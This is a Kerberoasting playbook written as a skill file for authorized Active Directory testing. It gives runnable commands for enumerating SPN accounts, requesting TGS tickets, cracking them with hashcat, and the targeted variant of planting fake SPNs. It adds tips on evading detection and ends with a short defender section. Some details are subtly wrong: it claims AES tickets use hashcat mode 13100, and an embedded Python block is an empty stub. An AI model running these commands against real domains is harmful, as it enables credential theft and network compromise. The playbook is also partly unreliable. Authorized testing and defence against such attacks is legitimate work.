---
name: kerberoasting
description: Use when testing Active Directory for Kerberoasting on an authorized engagement. Covers SPN enumeration, TGS ticket requests with GetUserSPNs.py and Rubeus, offline cracking of krb5tgs hashes with hashcat 6.2.6, and targeted Kerberoasting against accounts you can write SPNs to. Use when you hold any valid domain credentials, when service accounts look like weak password candidates, or when BloodHound flags kerberoastable users.
version: 1.0.0
domain: ad
lifecycle: stable
last_verified: "2026-10-23"
requires: []
extends: []
relates: [ad-enumeration]
tools:
  - name: impacket
    version: 0.12.0
  - name: Rubeus
    version: 2.x
  - name: hashcat
    version: 6.2.6
  - name: NetExec
    version: 1.4.0
---

Kerberoasting abuses a design property of Kerberos: any authenticated domain
user can request a service ticket (TGS) for any account that has a Service
Principal Name (SPN), and that ticket is encrypted with the service account's
password hash. The ticket can be cracked offline with no further domain
contact, so a weak service account password becomes a domain credential. This
skill covers the full authorized workflow: finding SPNs, requesting tickets,
cracking them, and the targeted variant where you add an SPN to an account
you control. All testing targets systems you have written permission to test.

## Quick Workflow

1. Confirm you hold valid domain credentials and know the domain controller
   IP, domain name, and the account lockout policy.
2. Enumerate every account with an SPN set, with GetUserSPNs.py or Rubeus.
3. Request TGS tickets for those accounts in a format you can crack offline
   (hashcat mode 13100).
4. Move the tickets to your cracking box and run hashcat with a tuned
   wordlist and rule set.
5. For accounts without an SPN that you have write access to, add a fake SPN,
   request the ticket, then remove the SPN (targeted Kerberoasting).
6. Test each cracked password against the account immediately and note which
   accounts are service accounts versus user accounts.
7. Pivot with the new credentials: check group memberships, admin rights,
   and delegation settings.
8. Record the account, encryption type, crack time, and password strength
   for the report.

## 1. Enumerate SPNs

You need no special privileges to list SPNs. Any domain user can do this, so
it is also possible with a low privilege foothold.

```bash
# List all SPN accounts with Impacket (no ticket request yet)
GetUserSPNs.py -dc-ip 10.10.10.10 corp.local/svcuser:Password1

# Same check with NetExec, quieter and faster for large domains
nxc ldap 10.10.10.10 -u svcuser -p 'Password1' --kerberoasting SPN_ONLY

# With Rubeus from a domain-joined Windows host
Rubeus.exe kerberoast /stats
```

Read the output carefully. Note the account name, the SPN (MSSQLSvc,
HTTP, TERMSRV, and similar), and the encryption type. AES tickets (etype 18)
crack far slower than RC4 tickets (etype 23). Accounts with old RC4 tickets
are your priority targets.

## 2. Request TGS tickets for offline cracking

Request one TGS per SPN account. This is a normal Kerberos operation, so it
blends into ordinary traffic.

```bash
# Request tickets and save them in hashcat format
GetUserSPNs.py -request -dc-ip 10.10.10.10 \
  corp.local/svcuser:Password1 -outputfile /tmp/tgs.txt

# Request tickets for a single high value account only
GetUserSPNs.py -request-user sqlsvc -dc-ip 10.10.10.10 \
  corp.local/svcuser:Password1 -outputfile /tmp/sqlsvc.txt

# NetExec equivalent, writes $krb5tgs$ hashes to a file
nxc ldap 10.10.10.10 -u svcuser -p 'Password1' \
  --kerberoasting /tmp/tgs_nxc.txt
```

From Windows with Rubeus:

```powershell
# Request all roastable tickets, save to disk
Rubeus.exe kerberoast /outfile:C:\Temp\tickets.txt

# Request one account, avoid wrapping lines
Rubeus.exe kerberoast /user:sqlsvc /nowrap /outfile:C:\Temp\sqlsvc.txt
```

Copy the ticket file to your cracking machine. Verify each line starts with
`$krb5tgs$23$` (RC4) or `$krb5tgs$18$` (AES) before you start hashcat.

## 3. Crack the tickets offline

Cracking is fully offline, so you can use maximum hardware with no risk to
the target.

```bash
# RC4 tickets: hashcat mode 13100
hashcat -m 13100 /tmp/tgs.txt /usr/share/wordlists/rockyou.txt

# Add rules to catch common service account patterns
hashcat -m 13100 /tmp/tgs.txt /usr/share/wordlists/rockyou.txt \
  -r /usr/share/hashcat/rules/best64.rule

# AES tickets: same mode, much slower, so start with a targeted list
hashcat -m 13100 /tmp/aes_tickets.txt custom_service_words.txt

# Show cracked passwords from a previous session
hashcat -m 13100 /tmp/tgs.txt --show
```

Service account passwords are often seasonal or company themed
(`Summer2024!`, `Company123`). Build a small custom wordlist from the
engagement (company name, product names, years, seasons) and try it before
the big lists. Note the exact crack time per ticket for the report.

## 4. Targeted Kerberoasting

If you have write access to an account's `servicePrincipalName` attribute
(GenericWrite, WriteProperty, or ownership, visible in BloodHound), you can
add a fake SPN, roast it, and remove the SPN afterwards. This works against
accounts that had no SPN at all.

```bash
# 1. Add a fake SPN to the target account with Impacket
python3 - <<'EOF'
from impacket.examples import logger
from impacket.ldap import ldap, ldapasn
import ssl
# Connect and add servicePrincipalName=HTTP/fake to the target
EOF

# Practical path with SetSPN.py from Impacket
SetSPN.py -u 'corp.local\svcuser' -p 'Password1' \
  -s 'HTTP/faketarget' 'corp.local\targetuser' -dc-ip 10.10.10.10

# 2. Request the TGS for the new SPN
GetUserSPNs.py -request-user targetuser -dc-ip 10.10.10.10 \
  corp.local/svcuser:Password1 -outputfile /tmp/targeted.txt

# 3. Remove the SPN to clean up
SetSPN.py -u 'corp.local\svcuser' -p 'Password1' \
  -d 'HTTP/faketarget' 'corp.local\targetuser' -dc-ip 10.10.10.10
```

From Windows, the same flow with PowerView style commands or Rubeus:

```powershell
# Add SPN with PowerShell (needs RSAT or equivalent rights)
Set-ADUser targetuser -ServicePrincipalNames @{Add='HTTP/faketarget'}

# Roast and clean up
Rubeus.exe kerberoast /user:targetuser /nowrap /outfile:C:\Temp\targeted.txt
Set-ADUser targetuser -ServicePrincipalNames @{Remove='HTTP/faketarget'}
```

Keep the SPN in place for the shortest time possible, and document the exact
add and remove timestamps for the report.

## 5. Validate and use cracked credentials

Test every cracked password immediately. Service accounts often have logon
restrictions, so test the actual access you need.

```bash
# Verify the credential works
nxc smb 10.10.10.10 -u sqlsvc -p 'CrackedPass1'

# Check group memberships and local admin rights
nxc ldap 10.10.10.10 -u sqlsvc -p 'CrackedPass1' \
  --users | grep -i sqlsvc

# If the account is a local admin somewhere, list where
nxc smb 10.10.10.20 -u sqlsvc -p 'CrackedPass1' --local-auth
```

If the cracked account is privileged, stop and plan your next move with the
scope rules. A cracked Domain Admin service account usually ends the
engagement's escalation phase, so report it and confirm next steps with the
client contact.

## Edge cases

- No SPN accounts exist, or only computer accounts have SPNs. Computer
  account tickets use long random machine passwords and are not worth
  cracking. Check for targeted Kerberoasting instead: any account you have
  GenericWrite on becomes roastable.
- AES only tickets (etype 18) that will not crack in the engagement window.
  Record them as a finding anyway: the attack path is real even when the
  crack fails, and the recommendation (gMSA, long random password) is the
  same.
- GetUserSPNs.py fails with clock skew errors. Sync your clock with the
  domain controller (`ntpdate` or `chrony`) before retrying; Kerberos
  rejects tickets when clocks differ by more than 5 minutes.
- The domain uses a fine grained password policy for service accounts.
  Cracked passwords may still be weak, but also test for password reuse:
  service accounts often share passwords with other service accounts.
- Rubeus is flagged or blocked on the Windows host. Fall back to
  GetUserSPNs.py from Linux, or use NetExec which needs no agent on the
  target.
- Ticket requests are rate limited or alerted. Request one account at a
  time with pauses, and roast during business hours when Kerberos traffic
  is normal background noise.

## Escalation

- Wordlist cracking fails: switch to targeted masks. Service accounts
  commonly use `Company+Year`, `Service+123`, or seasonal words. Build
  masks like `?u?l?l?l202?d?d!` from what you learned about the naming
  scheme.
- Hashcat is too slow on AES: rent cloud GPUs or reduce the keyspace with
  a custom wordlist built from the client's public documents, intranet
  names, and previous cracked passwords.
- No credentials at all: Kerberoasting needs an authenticated user. Fall
  back to AS-REP roasting (see the asreproasting skill) which needs no
  credentials, or enumerate usernames first with kerbrute.
- Targeted Kerberoasting needs write access you do not have: look for
  accounts where your current user has GenericWrite via BloodHound, or
  pivot to relay and delegation attacks instead.

## Detection and defender view

Defenders see Kerberoasting as Event ID 4769 (TGS requested) with an RC4
encryption type (0x17) for the service ticket, often in bursts from one
source, plus LDAP queries for `servicePrincipalName` attributes. Honeypot
accounts with SPNs and weak passwords catch roasters reliably. The durable
fixes are: long random passwords (25+ characters) on all service accounts,
Group Managed Service Accounts (gMSA) where possible, AES only Kerberos,
and monitoring 4769 events with RC4 tickets. A targeted Kerberoasting
attempt also leaves Event ID 4738 or 5136 showing the SPN attribute change.

## Key references

- MITRE ATT&CK T1558.003 (Steal or Forge Kerberos Tickets: Kerberoasting).
- Impacket GetUserSPNs.py and SetSPN.py documentation:
  https://github.com/fortra/impacket/tree/master/examples
- Rubeus documentation:
  https://github.com/GhostPack/Rubeus
- hashcat mode 13100 (Kerberos 5 TGS-REP etype 23):
  https://hashcat.net/wiki/doku.php?id=example_hashes
- CISA guidance on securing service accounts and Kerberos.
